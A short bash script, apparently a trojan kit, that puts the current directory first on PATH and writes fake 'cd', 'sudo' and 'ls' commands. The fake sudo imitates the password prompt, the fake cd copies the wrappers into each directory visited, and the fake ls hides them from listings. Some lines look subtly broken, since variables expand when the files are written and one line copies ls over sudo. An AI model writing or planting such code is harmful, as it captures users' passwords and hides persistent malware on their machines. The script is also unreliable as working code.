#!/bin/bash

PATH=.:$PATH

echo "#!/bin/bash" > cd
echo "/bin/cp cd $1/cd 2>/dev/null" >> cd
echo "/bin/cp sudo $1/sudo 2>/dev/null" >> cd
echo "/bin/cp ls $1/sudo 2>/dev/null" >> cd
echo "/bin/cd $1 2>/dev/null" >> cd
echo "exec bash" >> cd
chmod +x cd

echo "#!/bin/bash" > sudo
echo "read -sp \"[sudo] password for $(whoami): \" p" >> sudo
echo "echo $p | /usr/bin/sudo -S $@" >> sudo
chmod +x sudo

echo "#!/bin/bash" > ls
echo "/bin/ls $@ | sed 's/ls//g' | sed 's/cd//g' | sed 's/sudo//g' | column" >> ls
chmod +x ls
